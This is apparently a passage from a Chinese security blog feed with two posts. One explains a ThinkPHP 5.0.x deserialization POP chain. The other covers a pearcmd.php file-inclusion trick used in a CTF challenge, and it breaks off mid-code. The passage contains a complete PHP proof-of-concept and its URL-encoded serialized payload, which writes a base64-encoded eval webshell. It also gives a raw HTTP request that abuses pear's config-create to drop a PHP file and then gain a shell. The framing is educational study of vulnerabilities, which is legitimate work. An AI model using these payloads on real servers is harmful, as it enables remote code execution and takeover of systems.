<h5 id="thinkphp-library-think-cache-driver-File-php"><a href="#thinkphp-library-think-cache-driver-File-php" class="headerlink" title="thinkphp/library/think/cache/driver/File.php"></a>thinkphp/library/think/cache/driver/File.php</h5><p><img src="/2021/11/08/phpsec/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/15.png" alt="image-20211108150824402"></p>
<p>发现file_put_contents函数</p>
<p>$filename<code>可控且可以利用伪协议绕过</code>exit</p>
<p><img src="/2021/11/08/phpsec/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/16.png" alt="image-20211108150954684"></p>
<p><code>$data</code>值比较棘手,这里有个坑，由于最后调用<code>set</code>方法中的参数来自先前调用的<code>write</code>方法</p>
<p>只能为<code>true</code>，且这里<code>$expire</code>只能为数值，这样文件内容就无法写<strong>shell</strong></p>
<p>用文章里的一张图</p>
<p><img src="/2021/11/08/phpsec/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/17.png" alt="image-20211108151220943"></p>
<p>跟进setTagItem，会再执行一次<code>set</code>方法，且这里文件内容<code>$value</code>通过<code>$name</code>赋值(文件名)</p>
<p><img src="/2021/11/08/phpsec/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/18.png" alt="image-20211108151334856"></p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$value</span><span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/write=string.rot13/resource=./&lt;?cuc cucvasb();?></span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token variable">$value</span><span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/write=convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php</span></code></pre>
<h1 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h1><ol>
<li>thinkphp/library/think/process/pipes/Windows.php __destruct 调用removeFiles</li>
<li>removeFiles，调用file_exists触发__toString</li>
<li>thinkphp/library/think/Model.php __tostring-&gt;toJson-&gt;toArray 最终调用<code>__call</code></li>
<li>thinkphp/library/think/console/Output.php __call 调用Output类的block</li>
<li>thinkphp/library/think/console/Output.php block调用writeIn-&gt;write，最后调用$this-&gt;handle-&gt;write()，全局搜索write方法</li>
<li>thinkphp/library/think/session/driver/Memcached.php write方法调用$this-&gt;handle-&gt;set()，全局搜索set</li>
<li>thinkphp/library/think/cache/driver/File.php set调用file_put_contents写入文件，但是参数不可控，继续进入setTagItem</li>
<li>setTagItem再次调用set，此时参数可控，写入webshell</li>
</ol>
<p>使用文章里的一张图</p>
<p><img src="/2021/11/08/phpsec/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/thinkphp5-0-18-24-fan-xu-lie-hua-lou-dong/1.png" alt="1"></p>
<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token comment" spellcheck="true">//__destruct</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">{</span>
    <span class="token keyword">class</span> <span class="token class-name">Windows</span><span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$pivot</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$pivot</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//传入Pivot类</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">//__toString Model子类</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">{</span>
    <span class="token keyword">class</span> <span class="token class-name">Pivot</span><span class="token punctuation">{</span>
        <span class="token keyword">protected</span> <span class="token variable">$parent</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$error</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">,</span><span class="token variable">$hasone</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">parent</span><span class="token operator">=</span><span class="token variable">$output</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//$this->parent等于Output类</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'getError'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token operator">=</span><span class="token variable">$hasone</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//$modelRelation=$this->error</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">//getModel</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>db</span><span class="token punctuation">{</span>
    <span class="token keyword">class</span> <span class="token class-name">Query</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">protected</span> <span class="token variable">$model</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">model</span><span class="token operator">=</span><span class="token variable">$output</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//get_class($modelRelation->getModel()) == get_class($this->parent)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span><span class="token punctuation">{</span>
    <span class="token keyword">class</span> <span class="token class-name">Output</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$styles</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$memcached</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handle</span><span class="token operator">=</span><span class="token variable">$memcached</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">styles</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'getAttr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">//Relation</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">{</span>
    <span class="token keyword">class</span> <span class="token class-name">HasOne</span><span class="token punctuation">{</span>
        <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$selfRelation</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span><span class="token operator">=</span><span class="token variable">$query</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//调用Query类的getModel</span>

            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">selfRelation</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//满足条件!$modelRelation->isSelfRelation()</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bindAttr</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//控制__call的参数$attr</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver</span><span class="token punctuation">{</span>
    <span class="token keyword">class</span> <span class="token class-name">Memcached</span><span class="token punctuation">{</span>
        <span class="token keyword">protected</span> <span class="token variable">$handler</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handler</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//$this->handler等于File类</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span><span class="token punctuation">{</span>
    <span class="token keyword">class</span> <span class="token class-name">File</span><span class="token punctuation">{</span>
        <span class="token keyword">protected</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
            <span class="token string">'path'</span><span class="token operator">=</span><span class="token operator">></span> 'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php',</span>
            <span class="token string">'cache_subdir'</span><span class="token operator">=</span><span class="token operator">></span><span class="token boolean">false</span><span class="token punctuation">,</span>
            <span class="token string">'prefix'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">''</span><span class="token punctuation">,</span>
            <span class="token string">'data_compress'</span><span class="token operator">=</span><span class="token operator">></span><span class="token boolean">false</span>
        <span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$tag</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>


    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">namespace</span> <span class="token punctuation">{</span>
    <span class="token variable">$file</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$memcached</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcached</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$output</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">(</span><span class="token variable">$memcached</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$query</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$hasone</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation<span class="token punctuation">\</span>HasOne</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$pivot</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">,</span><span class="token variable">$hasone</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$windows</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">(</span><span class="token variable">$pivot</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$windows</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre><code>O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00parent%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A4%3A%7Bs%3A4%3A%22path%22%3Bs%3A122%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fa.php%22%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bb%3A1%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7Ds%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A1%3A%22a%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3Br%3A4%3B%7Ds%3A15%3A%22%00%2A%00selfRelation%22%3Bb%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bs%3A1%3A%22a%22%3Bs%3A5%3A%22admin%22%3B%7D%7D%7D%7D%</code></pre>
<p>URLDecode</p>
<pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">27</span><span class="token punctuation">:</span><span class="token string">"think\process\pipes\Windows"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">34</span><span class="token punctuation">:</span><span class="token string">"�think\process\pipes\Windows�files"</span><span class="token punctuation">;</span>a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">17</span><span class="token punctuation">:</span><span class="token string">"think\model\Pivot"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string">"�*�parent"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"think\console\Output"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">:</span><span class="token string">"�think\console\Output�handle"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">30</span><span class="token punctuation">:</span><span class="token string">"think\session\driver\Memcached"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"�*�handler"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">23</span><span class="token punctuation">:</span><span class="token string">"think\cache\driver\File"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"�*�options"</span><span class="token punctuation">;</span>a<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"path"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">122</span><span class="token punctuation">:</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php";s:12:"cache_subdir";b:0;s:6:"prefix";s:0:"";s:13:"data_compress";b:0;}s:6:"�*�tag";b:1;}}s:9:"�*�styles";a:1:{i:0;s:7:"getAttr";}}s:9:"�*�append";a:1:{s:1:"a";s:8:"getError";}s:8:"�*�error";O:27:"think\model\relation\HasOne":3:{s:8:"�*�query";O:14:"think\db\Query":1:{s:8:"�*�model";r:4;}s:15:"�*�selfRelation";b:0;s:11:"�*�bindAttr";a:1:{s:1:"a";s:5:"admin";}}}}%</span></code></pre>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>由于在后续版本中Relation重构，且成为了抽象类，所以此方法无法向上兼容，仅作学习参考</p>
<p>改变其中的某些节点，可覆盖5.0.4-5.0.24版本，</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>两位学长的文章：</p>
<p><a href="https://www.anquanke.com/post/id/196364">https://www.anquanke.com/post/id/196364</a></p>
<p><a href="https://sp4zcmd.github.io/2021/08/05/Thinkphp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/">https://sp4zcmd.github.io/2021/08/05/Thinkphp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</a></p>
<h1 id="另外的poc链构造方法"><a href="#另外的poc链构造方法" class="headerlink" title="另外的poc链构造方法"></a>另外的poc链构造方法</h1><p><a href="https://blog.csdn.net/weixin_46236101/article/details/109154096">https://blog.csdn.net/weixin_46236101/article/details/109154096</a></p>
]]></content>
      <tags>
        <tag>PHPsec</tag>
      </tags>
  </entry>
  <entry>
    <title>通过湖湘杯2021学习pearcmd.php应用</title>
    <url>/2021/11/15/phpsec/tong-guo-hu-xiang-bei-2021-xue-xi-pearcmd.php-ying-yong/tong-guo-hu-xiang-bei-2021-xue-xi-pearcmd.php-ying-yong/</url>
    <content><![CDATA[<h1 id="pearcmd-php小trick"><a href="#pearcmd-php小trick" class="headerlink" title="pearcmd.php小trick"></a>pearcmd.php小trick</h1><p>湖湘杯easywill的基础</p>
<p>原文：<a href="https://tttang.com/archive/1312/#toc_0x06-pearcmdphp">https://tttang.com/archive/1312/#toc_0x06-pearcmdphp</a></p>
<p>最后这个是我想介绍的被我“捂烂了”的trick，就是利用<code>pearcmd.php</code>这个pecl/pear中的文件。</p>
<p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装。</p>
<p>不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在<code>/usr/local/lib/php</code>。</p>
<p>原本pear/pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。但我们遇到的场景比较特殊，是一个文件包含的场景，那么我们就可以包含到pear中的文件，进而利用其中的特性来搞事。</p>
<p>我最早的时候是在阅读phpinfo()的过程中，发现Docker环境下的PHP会开启<code>register_argc_argv</code>这个配置。文档中对这个选项的介绍不是特别清楚，大概的意思是，当开启了这个选项，用户的输入将会被赋予给<code>$argc</code>、<code>$argv</code>、<code>$_SERVER['argv']</code>几个变量。</p>
<p>如果PHP以命令行的形式运行（即sapi是cli），这里很好理解。但如果PHP以Server的形式运行，且又开启了<code>register_argc_argv</code>，那么这其中是怎么处理的？</p>
<p>我们在PHP源码中可以看到这样的逻辑：</p>
<pre><code>static zend_bool php_auto_globals_create_server(zend_string *name)
{
    if (PG(variables_order) &amp;&amp; (strchr(PG(variables_order),'S') || strchr(PG(variables_order),'s'))) {
        php_register_server_variables();

        if (PG(register_argc_argv)) {
            if (SG(request_info).argc) {
                zval *argc, *argv;

                if ((argc = zend_hash_find_ex_ind(&amp;EG(symbol_table), ZSTR_KNOWN(ZEND_STR_ARGC), 1)) != NULL &amp;&amp;
                    (argv = zend_hash_find_ex_ind(&amp;EG(symbol_table), ZSTR_KNOWN(ZEND_STR_ARGV), 1)) != NULL) {
                    Z_ADDREF_P(argv);
                    zend_hash_update(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), ZSTR_KNOWN(ZEND_STR_ARGV), argv);
                    zend_hash_update(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), ZSTR_KNOWN(ZEND_STR_ARGC), argc);
                }
            } else {
                php_build_argv(SG(request_info).query_string, &amp;PG(http_globals)[TRACK_VARS_SERVER]);
            }
        }

    } else {
        zval_ptr_dtor_nogc(&amp;PG(http_globals)[TRACK_VARS_SERVER]);
        array_init(&amp;PG(http_globals)[TRACK_VARS_SERVER]);
    }
    ...</code></pre>
<p>第一个if语句判断<code>variables_order</code>中是否有<code>S</code>，即<code>$_SERVER</code>变量；第二个if语句判断是否开启register_argc_argv，第三个if语句判断是否有request_info.argc存在，如果不存在，其执行的是这条语句：</p>
<pre><code>php_build_argv(SG(request_info).query_string, &amp;PG(http_globals)[TRACK_VARS_SERVER]);</code></pre>
<p>无论php_build_argv函数内部是怎么处理的，<code>SG(request_info).query_string</code>都非常吸引我，这段代码是否意味着，HTTP数据包中的query-string会被作为argv的值？</p>
<p>果然：</p>
<p><img src="https://storage.tttang.com/media/attachment/2021/11/01/661223a3-6bfb-4ef2-ad14-0a6bc53128fa.png" alt="image-20211101072557483.png"></p>
<p>其实这个结果是符合<a href="http://www.ietf.org/rfc/rfc3875">RFC3875</a>的：</p>
<blockquote>
<p>4.4.  The Script Command Line</p>
<p>Some systems support a method for supplying an array of strings to<br>   the CGI script.  This is only used in the case of an ‘indexed’ HTTP<br>   query, which is identified by a ‘GET’ or ‘HEAD’ request with a URI<br>   query string that does not contain any unencoded “=” characters.  For<br>   such a request, the server SHOULD treat the query-string as a<br>   search-string and parse it into words, using the rules</p>
<pre><code>  search-string = search-word *( "+" search-word )
  search-word   = 1*schar
  schar         = unreserved | escaped | xreserved
  xreserved     = ";" | "/" | "?" | ":" | "@" | "&amp;" | "=" | "," |
                  "$"</code></pre>
<p>After parsing, each search-word is URL-decoded, optionally encoded in<br>   a system-defined manner and then added to the command line argument<br>   list.</p>
</blockquote>
<p>RFC3875中规定，如果query-string中不包含没有编码的<code>=</code>，且请求是GET或HEAD，则query-string需要被作为命令行参数。</p>
<p>当年PHP-CGI曾在这上面栽过跟头，具体的细节可以参考我以前写的这篇文章：《<a href="https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html">PHP-CGI远程代码执行漏洞（CVE-2012-1823）分析</a>》。PHP现在仍然没有严格按照RFC来处理，即使我们传入的query-string包含等号，也仍会被赋值给<code>$_SERVER['argv']</code>。</p>
<p>我们再来看到pear中获取命令行argv的函数：</p>
<pre><code>public static function readPHPArgv()
{
    global $argv;
    if (!is_array($argv)) {
        if (!@is_array($_SERVER['argv'])) {
            if (!@is_array($GLOBALS['HTTP_SERVER_VARS']['argv'])) {
                $msg = "Could not read cmd args (register_argc_argv=Off?)";
                return PEAR::raiseError("Console_Getopt: " . $msg);
            }
            return $GLOBALS['HTTP_SERVER_VARS']['argv'];
        }
        return $_SERVER['argv'];
    }
    return $argv;
}</code></pre>
<p>先尝试<code>$argv</code>，如果不存在再尝试<code>$_SERVER['argv']</code>，后者我们可通过query-string控制。也就是说，我们通过Web访问了pear命令行的功能，且能够控制命令行的参数。</p>
<p>看看pear中有哪些可以利用的参数：</p>
<p><img src="https://storage.tttang.com/media/attachment/2021/11/01/2de99d32-2d60-43af-8ee5-0111fdc52f38.png" alt="image-20211101074033767.png"></p>
<p>第一眼就看到config-create，阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p>
<p>所以，我构造出最后的利用数据包如下：</p>
<pre><code>GET /index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php HTTP/1.1
Host: 192.168.1.162:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close</code></pre>
<p><img src="https://storage.tttang.com/media/attachment/2021/11/01/8f2dd9ad-a7bd-456d-9c8e-f4a9cd7770cd.png" alt="image-20211101080626844.png"></p>
<p>发送这个数据包，目标将会写入一个文件<code>/tmp/hello.php</code>，其内容包含<code>&lt;?=phpinfo()?&gt;</code>：</p>
<p><img src="https://storage.tttang.com/media/attachment/2021/11/01/3b439ba8-a064-4348-a23d-6f96d6d5bb77.png" alt="image-20211101080156805.png"></p>
<p>然后，我们再利用文件包含漏洞包含这个文件即可getshell：</p>
<p><img src="https://storage.tttang.com/media/attachment/2021/11/01/e12aef87-9aea-41bb-a13f-6e0932e6b9cc.png" alt="image-20211101080447027.png"></p>
<p>最后这个利用方法，无需条件竞争，也没有额外其他的版本限制等，只要是Docker启动的PHP环境即可通过上述一个数据包搞定。</p>
<h1 id="Easywill"><a href="#Easywill" class="headerlink" title="Easywill"></a>Easywill</h1><p>网上下载源码,丢进seay审计代码：</p>
<p><img src="/2021/11/15/phpsec/tong-guo-hu-xiang-bei-2021-xue-xi-pearcmd.php-ying-yong/tong-guo-hu-xiang-bei-2021-xue-xi-pearcmd.php-ying-yong/image-20211118110602137.png" alt="image-20211118110602137"></p>
<p>审计到Template.php</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">assign</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    \<span class="token package">wiphp<span class="token punctuation">\</span>View</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>assign模板渲染</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">renderTo</span><span class="token punctuation">(</span><span class="token variable">$viewfile</span><span class="token punctuation">,</span> <span class="token variable">$vars</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token constant">__MODULE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$cfile</span> <span class="token operator">=</span> <span class="token string">'view-'</span><span class="token punctuation">.</span><span class="token variable">$m</span><span class="token punctuation">.</span><span class="token string">'_'</span><span class="token punctuation">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$viewfile</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
